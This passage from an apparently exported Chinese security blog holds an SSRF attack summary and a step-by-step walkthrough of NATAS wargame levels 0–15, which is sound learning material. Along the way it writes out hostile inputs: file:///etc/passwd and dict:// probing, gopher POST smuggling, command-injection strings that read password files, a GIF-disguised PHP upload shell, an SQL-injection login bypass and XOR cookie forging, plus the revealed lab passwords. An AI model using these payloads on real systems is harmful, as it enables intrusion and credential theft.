<p>参考：CSDN[零点敲代码]<a href="http://t.csdn.cn/sb9kA">http://t.csdn.cn/sb9kA</a></p>
</blockquote>
<h2 id="ssrf总结"><a href="#ssrf总结" class="headerlink" title="ssrf总结"></a>ssrf总结</h2><p>ssrf通过<strong>欺骗服务器发起请求到攻击者指定的URL</strong>，可以是外部URL或内部网络的URL。</p>
<p>主要原因在于服务器对用户提供的URL或调用远程服务器的返回信息没有进行验证及过滤，导致传入服务器的数据可能存在其他非正常行为。而且这类非正常行为会被执行和回显。</p>
<p>针对这类情况，有效的防护手段包括：</p>
<p>1）双向过滤用户端参数，严格限定输入参数、返回结果的数据类型及内容。</p>
<p>2）限制请求行为端口，并针对具有服务器请求业务的网络范围进行严格划分。</p>
<p>3）针对内网地址添加黑\白名单，参考以上实例。</p>
<p>4）尽可能实现业务集中化调用，并尽量减少这类直接发起主动请求的业务行为。</p>
<p>针对SSRF漏洞防护，最合理的措施是从开发阶段就针对服务器的主动请求行为进行统一规划及防护，从而有效解决上述问题。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>如果可以从指定 <code>URL</code> 地址获取网页文本内容、加载指定地址的图片、下载等。</p>
<p>那么对于这个地址，攻击者输入一个内网ip，服务存在，则能请求成功，进而判断内网服务的情况。</p>
<blockquote>
<p>对外网、服务器所在内网、本地进行端口扫描（敏感端口），获取一些服务器的banner信息</p>
<p>攻击者可以输入一些不常见，但有效的 <code>URL</code>，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com:8080/...</span><br><span class="line">http://example.com:22/...</span><br><span class="line">http://example.com:3306/...</span><br></pre></td></tr></table></figure>

<ul>
<li>根据服务器的返回信息来判断端口的开放情况，大部分的应用并不会去判断端口，只要是有效的 <code>URL</code>，就会发出请求</li>
<li>对于大多数应用，一般不会直接返回 <code>banner</code> 信息，可以通过报出的错误信息、响应时间、响应包大小来判断</li>
</ul>
</blockquote>
<h2 id="2023-7-6更新了一下"><a href="#2023-7-6更新了一下" class="headerlink" title="2023.7.6更新了一下"></a>2023.7.6更新了一下</h2><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>首先，一个网站，它如果有查询网站功能、识图功能、天气查询之类的都可以试一试。</p>
<p>以查询网站功能为例</p>
<p>输入经典的外网url</p>
<blockquote>
<p><a href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a>  访问百度的robots.txt</p>
</blockquote>
<p>如果回显了，再试试内网</p>
<blockquote>
<p>127.0.0.1</p>
</blockquote>
<p>一般是当前浏览界面的“套娃”，基本可以判定存在咯。</p>
<h3 id="获取本地信息"><a href="#获取本地信息" class="headerlink" title="获取本地信息"></a>获取本地信息</h3><blockquote>
<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd #本地文件信息</p>
</blockquote>
<blockquote>
<p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts  #看机器内网地址</p>
<p>…&#x2F;etc&#x2F;network&#x2F;interfaces #机器网络状况</p>
</blockquote>
<p>比如内网地址为172.72.23.20</p>
<h3 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h3><p>这个探测的是172.72.23.1&#x2F;24 这<strong>网段</strong>的端口</p>
<p>burp，爆破，</p>
<p>主机号范围反正就在1-254之间</p>
<p>端口从21开始递增</p>
<blockquote>
<p>dict:&#x2F;&#x2F;172.72.23.$21:$端口</p>
</blockquote>
<p>也可http协议获取内网中web<strong>应用信息情况</strong></p>
<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>ip&#x2F;phpinfo.php </p>
<p>或上传一句话</p>
<h3 id="内网目录扫描"><a href="#内网目录扫描" class="headerlink" title="内网目录扫描"></a>内网目录扫描</h3><p>使用 Burpsuite 自带的 Grep - Extract 可以快速地筛选页面正则匹配的结果；字典爆破</p>
<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>若内网的有些php文件嘞，用了system这样不安全函数</p>
<p>以get变量为例，直接访问url</p>
<blockquote>
<p><a href="http://ip/index.php?cmd=cat">http://ip/index.php?cmd=cat</a> &#x2F;etc&#x2F;hosts</p>
</blockquote>
<p>空格可以用%2520，二次编码</p>
<h3 id="内网SQL-注入"><a href="#内网SQL-注入" class="headerlink" title="内网SQL 注入"></a>内网SQL 注入</h3><p>万一里面是一个ID查询员工信息的网页</p>
<p>1.sql注入</p>
<p>2.通过sql语句，往网站目录写shell（即将已知文件夹路径里写进一个文件，需要写权限；into dumpfile）</p>
<h3 id="内网命令执行"><a href="#内网命令执行" class="headerlink" title="内网命令执行"></a>内网命令执行</h3><p>典型场景是，一个ping ip的输入框；POST 方式吧，提交参数为 ip|ipconfig之类的。</p>
<p>但是内网的话，Post怎么触发。内网无法用http协议传递post了。</p>
<p>所以引入了gopher协议。</p>
<p>格式</p>
<blockquote>
<p>gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_&lt;TCP数据流&gt;</p>
</blockquote>
<p>可以传递最底层的 TCP 数据流，因为 HTTP 协议也是属于 TCP 数据层的，所以通过 gopher 协议传递 HTTP 的 POST 请求也是轻而易举的。</p>
<p>首先来抓取正常情况下 POST 请求的数据包，删除掉 HTTP 请求的这一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

<p>否则，ssrf请求会乱码</p>
<p>再将bp中的数据包内容全选，并两次url编码</p>
<p>两次 URL 编码后的数据就最终的 TCP 数据流，最终 SSRF 完整的攻击请求的 POST 数据包如下：</p>
<blockquote>
<p>gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_&lt;两次url编码后的TCP数据流&gt;</p>
</blockquote>
<p>在bp的末尾加上即可。ip&#x3D;…</p>
<h3 id="xxe-暂略"><a href="#xxe-暂略" class="headerlink" title="xxe(暂略)"></a>xxe(暂略)</h3><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-MySQL-%E6%8F%90%E6%9D%83">国光的博客</a></p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>csrf</category>
        <category>ssrf</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>csrf</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>NATAS</title>
    <url>/2023/05/14/NATAS/</url>
    <content><![CDATA[<h2 id="NATAS-0"><a href="#NATAS-0" class="headerlink" title="NATAS 0"></a>NATAS 0</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141731305.png" alt="image-20230516141731305"></p>
<p>查看源代码页面。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516141801967.png" alt="image-20230516141801967"></p>
<p>g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</p>
<h2 id="NATAS-1"><a href="#NATAS-1" class="headerlink" title="NATAS 1"></a>NATAS 1</h2><p>You can find the password for the next level on this page, but rightclicking has been blocked! </p>
<p>右键菜单用不了，直接url栏添加view-source:</p>
<p>h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</p>
<h2 id="NATAS-2-路径"><a href="#NATAS-2-路径" class="headerlink" title="NATAS 2(路径)"></a>NATAS 2(路径)</h2><p>There is nothing on this page </p>
<p>右键菜单得</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516142055627.png" alt="image-20230516142055627"></p>
<p>这么小一个点，让我想到了图片宽高比</p>
<p>打开winhex，发现就是png，好吧，没用</p>
<p>f12查看网络嘞，发现了base64编码，解码后发现是第二关的密码，没用</p>
<p>看了wp才知道，&#x2F;files试试，查看路径</p>
<p><code>http://natas2.natas.labs.overthewire.org/files</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/20230516152928.png" alt="index"></p>
<h2 id="NATAS-3-robots-txt"><a href="#NATAS-3-robots-txt" class="headerlink" title="NATAS 3(robots.txt)"></a>NATAS 3(robots.txt)</h2><p>There is nothing on this page</p>
<p>查看源代码后</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516180626251.png" alt="image-20230516180626251"></p>
<p>好像确实没东西诶。</p>
<p>看了wp，提示说搜索引擎的话，看robots.txt</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516182801703.png" alt="image-20230516182801703"></p>
<p>路径 &#x2F;s3cr3t&#x2F;</p>
<p>输入下，给了user.txt，点击查看得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</span><br></pre></td></tr></table></figure>

<h2 id="NATAS-4-Referer注入"><a href="#NATAS-4-Referer注入" class="headerlink" title="NATAS 4(Referer注入)"></a>NATAS 4(Referer注入)</h2><p><img src="/../../../Typora/img111/image-20230516182950328.png" alt="image-20230516182950328"></p>
<p>说是没权限，考虑要bp，右键链接，抓包后把referer改一下</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183538845.png" alt="image-20230516183538845"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183557188.png" alt="image-20230516183557188"></p>
<p>Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</p>
<h2 id="NATAS-5-Cookie注入"><a href="#NATAS-5-Cookie注入" class="headerlink" title="NATAS 5(Cookie注入)"></a>NATAS 5(Cookie注入)</h2><p>Access disallowed. You are not logged in</p>
<p>查看源代码，没有。</p>
<p>直接抓包吧</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183915010.png" alt="image-20230516183915010"></p>
<p>Cookie处为0，改为1试试</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516183943554.png" alt="image-20230516183943554"></p>
<h2 id="NATAS-6-php代码审计"><a href="#NATAS-6-php代码审计" class="headerlink" title="NATAS 6 (php代码审计)"></a>NATAS 6 (php代码审计)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184055751.png" alt="image-20230516184055751"></p>
<p>看下源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516184111016.png" alt="image-20230516184111016"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_key_exists ( mixed $key , array $array ) : bool</span><br></pre></td></tr></table></figure>

<p>检查数组中是否存在指定键名。</p>
<p>我们看路径为，includes&#x2F;secret.inc</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194213702.png" alt="image-20230516194213702"></p>
<p>也就是说输入的值要和该路径值是相同的</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194332011.png" alt="image-20230516194332011"></p>
<h2 id="NATAS-7-任意命令执行"><a href="#NATAS-7-任意命令执行" class="headerlink" title="NATAS 7 (任意命令执行)"></a>NATAS 7 (任意命令执行)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194441515.png" alt="natas7页面"></p>
<p>点击之后出现效果</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516194519670.png" alt="natas7的home页面"></p>
<p>查看源代码提示了密码位置</p>
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202112882.png" alt="image-20230516202112882"></p>
<h2 id="NATAS-8-php代码审计"><a href="#NATAS-8-php代码审计" class="headerlink" title="NATAS 8 (php代码审计)"></a>NATAS 8 (php代码审计)</h2><p>和NATAS 6一样的页面，我们看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516202232789.png" alt="NATAS 8源代码"></p>
<p>分析代码可知，输入框中的值经过encodeSecret()函数处理后的值与上述3d…相等即可</p>
<p>先base64_encode，再strrev(逆置)，再bin2hex(ASCII字符串转化为16进制)</p>
<p><code>hex2bin(hexString)</code>的作用是将字符串作为<code>十六进制</code>的模式进行处理，”68656c6c6f”<code>会被处理成</code>“68” “65” “6c” “6c” “6f”<code>，然后转换成对应的二进制数值，</code>“68”（注意是字符串 2bytes）<code>转为二进制数值是 </code>01101000（注意是数值 1byte）<code>，输出至终端其实就是</code>h（1bytes）<code>的，依次处理后，我们成功的将</code>10bytes<code>的字符串</code>“68656c6c6f”<code>转换成了</code>5bytes<code>的字符串</code>“hello”&#96;</p>
<p><code>bin2hex(binString)</code>则是将待处理的数据的<code>二进制bit串</code>进行<code>16进制</code>转换，并返回相应的<code>16进制形式的字符串</code>，这里的<code>bin</code>是说会将其作为二进制流，转换成对应的十六进制流，然后再以对应的字符串方式返回。比如<code>&quot;h&quot;</code>的<code>二进制bit串</code>是<code>01101000</code>，对应的十六进制是 <code>0x68</code>，相应的字符串形式是<code>&quot;68&quot;</code>，依次继续解包处理 <code>&quot;e&quot; &quot;l&quot; &quot;l&quot; &quot;o&quot;</code> 后得到的字符串就是<code>&quot;68656c6c6f&quot;</code>。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204322265.png" alt="image-20230516204322265"></p>
<p>参考：<a href="https://blog.csdn.net/weixin_33896726/article/details/91966490"> hex2bin &#x2F; bin2hex &#x2F; pack &#x2F; unpack 的理解及应用_weixin_33896726的博客-CSDN博客</a></p>
<p>那么进行相反操作，先hex2bin()-&gt;strrev-&gt;base64_decode</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204429541.png" alt="image-20230516204429541"></p>
<p>输入框提交oubWYf2kBq即可。</p>
<h2 id="NATAS-9-RCE"><a href="#NATAS-9-RCE" class="headerlink" title="NATAS 9 (RCE)"></a>NATAS 9 (RCE)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204620916.png" alt="image-20230516204620916"></p>
<p>先看源代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516204642815.png" alt="image-20230516204642815"></p>
<p><em>passthru</em>() 允许您运行外部程序，并在屏幕上显示结果。不需要使用 echo 或 return 来查看结果</p>
<p>上述代码应该是如果key不为空，就去在dictionary.txt去找含key的行</p>
<p>grep，linux中的文本匹配命令, -i 不区分大小写地搜索</p>
<p>看看txt文件内容</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516205145633.png" alt="image-20230516205145633"></p>
<p>嘶，有什么意义嘞。</p>
<p>看了wp说是，已知grep，应该联想到<strong>命令注入漏洞</strong>，又已知&#x2F;etc&#x2F;natas_webpass目录下存放着各级命令。截断grep命令即可。</p>
<p><code>;cat /etc/natas_webpass/natas10 #</code></p>
<p>;用于截断前面的grep -i，#用于注释后面的dictionary.txt</p>
<h2 id="NATAS-10-RCE"><a href="#NATAS-10-RCE" class="headerlink" title="NATAS 10 (RCE)"></a>NATAS 10 (RCE)</h2><p>在NATAS 9的基础上，For security reasons, we now filter on certain characters，过滤了一些特定字符</p>
<p>源代码可以看出</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516214122214.png" alt="image-20230516214122214"></p>
<p>过滤了常见符 &amp;、|、;</p>
<p>哦豁，那咋办。</p>
<p>可用**%0a、%0d代替**。</p>
<p><code>%0a cat /etc/natas_webpass/natas11#</code></p>
<p>输入框输入提交时，无显示；</p>
<p><strong>直接在url处输入。</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516215849290.png" alt="image-20230516215849290"></p>
<p>参考：命令注入的各种绕过：<a href="https://blog.csdn.net/qq_41497476/article/details/107042961?ops_request_misc=%7B%22request_id%22:%22168424518616800215084685%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168424518616800215084685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-107042961-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=;%7C&%5D%E8%BF%87%E6%BB%A4&spm=1018.2226.3001.4187">CTFhub RCE 命令注入部分_qq_41497476的博客-CSDN博客</a></p>
<h2 id="NATAS-11-php代码审计、异或逆推、修改Cookie"><a href="#NATAS-11-php代码审计、异或逆推、修改Cookie" class="headerlink" title="NATAS 11 (php代码审计、异或逆推、修改Cookie)"></a>NATAS 11 (php代码审计、异或逆推、修改Cookie)</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516220039092.png" alt="natas11页面"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">if($data[&quot;showpassword&quot;] == &quot;yes&quot;) &#123;`</span><br><span class="line">  `print &quot;The password for natas12 is &lt;censored&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>先从最后的代码分析，如果$data[“showpassword”] &#x3D;&#x3D; “yes”，即可得到密码。showpassword是什么？</p>
<p>原始的数据是个数组，有两部分，它的showpassword部分是no。</p>
<p>看$data怎么得到哈，从最后看起，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line">$data = loadData($defaultdata);</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;bgcolor&quot;,$_REQUEST)) &#123;</span><br><span class="line">  if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $_REQUEST[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $data[&#x27;bgcolor&#x27;] = $_REQUEST[&#x27;bgcolor&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">saveData($data);</span><br></pre></td></tr></table></figure>



<p>这一段就是页面上，点击按钮，就设置颜色那一块。</p>
<p>看一下loadData()、saveData()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function loadData($def) &#123;</span><br><span class="line">  global $_COOKIE;</span><br><span class="line">  $mydata = $def;#输入的值</span><br><span class="line">  if(array_key_exists(&quot;data&quot;, $_COOKIE)) &#123;</span><br><span class="line">  $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[&quot;data&quot;])), true);#将cookie先base64解码，再异或后json解码才与输入值是同类型</span><br><span class="line"> </span><br><span class="line">  if(is_array($tempdata) &amp;&amp; array_key_exists(&quot;showpassword&quot;, $tempdata) &amp;&amp; array_key_exists(&quot;bgcolor&quot;, $tempdata)) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^#(?:[a-f\d]&#123;6&#125;)$/i&#x27;, $tempdata[&#x27;bgcolor&#x27;])) &#123;</span><br><span class="line">    $mydata[&#x27;showpassword&#x27;] = $tempdata[&#x27;showpassword&#x27;];</span><br><span class="line">    $mydata[&#x27;bgcolor&#x27;] = $tempdata[&#x27;bgcolor&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $mydata;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个作用应该是将原始数组解密，存成mydata数组</p>
<p><code>function saveData($d) &#123;   setcookie(&quot;data&quot;, base64_encode(xor_encrypt(json_encode($d))));</code><br><code>&#125;</code></p>
<p>将编码后的值存到_COOKIE[“data”]中。</p>
<p>xor_encrypt()函数内容为</p>
<pre><code>function xor_encrypt($in) &#123;
    $key = &#39;&lt;censored&gt;&#39;;#键值
    $text = $in;#输入值
    $outText = &#39;&#39;;
// Iterate through each character
for($i=0;$i&lt;strlen($text);$i++) &#123;
$outText .= $text[$i] ^ $key[$i % strlen($key)];
&#125;

return $outText;#新值
&#125;
</code></pre>
<p>综上，xor..函数的输入值是将原cookie经过base64_decode的值</p>
<p>思路为：原始data 异或 key&#x3D;加密data</p>
<p>​				原始data 异或 加密data&#x3D;key</p>
<p>​				之后再构造新data，即(…&#x3D;“yes”)，用得到的key加密，存回cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原始data为array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br></pre></td></tr></table></figure>

<p>通过f12网络可知data</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516230016557.png" alt="image-20230516230016557"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">加密data为MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D</span><br></pre></td></tr></table></figure>

<p>异或俩data，得到key</p>
<p>得到的值有点怪</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=base64_decode(&quot;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qe354bjY%3D&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =json_encode(array(&quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;));</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo xor_encrypt($data);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516234336935.png" alt="image-20230516234336935"></p>
<p>这三个框emmm</p>
<p><strong>所以key&#x3D;KNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLKNHLLKL</strong></p>
<p>我这里出现了问题，key是它的话，不成功，但是看大佬的wp，是只取了前4位的，所以我也取前4位试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=array( &quot;showpassword&quot;=&gt;&quot;yes&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);</span><br><span class="line">	function xor_encrypt($in) &#123;</span><br><span class="line">		$key =&#x27;KNHL&#x27;;</span><br><span class="line">		$text = $in;</span><br><span class="line">		$outText = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">		// Iterate through each character</span><br><span class="line">		for($i=0;$i&lt;strlen($text);$i++) &#123;</span><br><span class="line">		$outText .= $text[$i]^ $key[$i % strlen($key)];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		return $outText;</span><br><span class="line">	&#125;</span><br><span class="line">echo base64_encode(xor_encrypt(json_encode($data)));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz这就是新cookie了，用bp进行POST时，Cookie换上它。其实也可以f12控制台里document.cookie进行设置</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230516235350410.png" alt="image-20230516235350410"></p>
<p>YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</p>
<p>参考：<a href="https://blog.csdn.net/M110K/article/details/112486709?ops_request_misc=%7B%22request_id%22:%22168424913616800182177459%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168424913616800182177459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-112486709-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=natas11&spm=1018.2226.3001.4187">(8WarGame系列之Natas(Web安全)通关指北(中级篇11-20) 详细版_KEY0NE的博客-CSDN博客</a></p>
<h2 id="NATAS-12-文件上传-任意文件"><a href="#NATAS-12-文件上传-任意文件" class="headerlink" title="NATAS 12(文件上传-任意文件)"></a>NATAS 12(文件上传-任意文件)</h2><p>效果是上传的文件都会被改名，且后缀改为jpg。而文件上传木马只有php时才有效果。</p>
<p>抓包，改后缀为php</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517111546504.png" alt="image-20230517111546504"></p>
<p>用蚁剑连接的方式貌似失败诶，那就改成如下内容：</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517112515856.png" alt="image-20230517112515856"></p>
<p>上传成功后，点击链接就可以</p>
<p>lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</p>
<h2 id="NATAS-13-文件上传-仅图像文件"><a href="#NATAS-13-文件上传-仅图像文件" class="headerlink" title="NATAS 13(文件上传-仅图像文件)"></a>NATAS 13(文件上传-仅图像文件)</h2><p>在NATAS 12的基础上，有For security reasons, we now only accept image files!</p>
<p>改后缀绕过都不行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (! exif_imagetype($_FILES[&#x27;uploadedfile&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">    echo &quot;File is not an image&quot;;</span><br></pre></td></tr></table></figure>

<p><code>exif_imagetype()</code> 来验证文件类型，</p>
<p>那么在文件开头加上GIF98a.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF98a</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(&#x27;cat /etc/natas_webpass/natas14&#x27;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517115603042.png" alt="image-20230517115603042"></p>
<p>qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
<h2 id="NATAS-14（登陆页面）"><a href="#NATAS-14（登陆页面）" class="headerlink" title="NATAS 14（登陆页面）"></a>NATAS 14（登陆页面）</h2><p>登陆页面，随便输入账号密码，提交后出现，权限拒绝</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230518140929790.png" alt="image-20230518140929790"></p>
<p>直接将Sql语句拼接，存在sql注入</p>
<p><code>username=123&quot; or 1=1#&amp;password=123&quot;</code></p>
<p>#之后是注释掉了</p>
<p>原sql语句会变成：</p>
<p><code>SELECT * from users where username=&quot;123&quot; or 1=1#</code></p>
<p>即条件始终为真。</p>
<p>Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</p>
<h2 id="NATAS-15-输入框提交"><a href="#NATAS-15-输入框提交" class="headerlink" title="NATAS 15 (输入框提交)"></a>NATAS 15 (输入框提交)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysqli_connect(&#x27;localhost&#x27;, &#x27;natas15&#x27;, &#x27;&lt;censored&gt;&#x27;);</span><br><span class="line">    mysqli_select_db($link, &#x27;natas15&#x27;);</span><br><span class="line"></span><br><span class="line">    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;;</span><br><span class="line">    if(array_key_exists(&quot;debug&quot;, $_GET)) &#123;</span><br><span class="line">        echo &quot;Executing query: $query&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $res = mysqli_query($link, $query);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">    if(mysqli_num_rows($res) &gt; 0) &#123;</span><br><span class="line">        echo &quot;This user exists.&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error in query.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mysqli_query(link,query)在数据库中执行一条sql语句</p>
<p>link指建立的连接，query查询字符串</p>
<p>看了wp，说是盲注。</p>
<p>。。。。。。。。</p>
<p>它应该会对内容进行检测，试试图片码</p>
<p><code>copy mm.php/a+a.jpg/b 3.jpg</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230517114223870.png" alt="image-20230517114223870"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>web</tag>
        <tag>NATAS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE学习</title>
    <url>/2023/05/20/CVE%E9%83%A8%E5%88%86/</url>
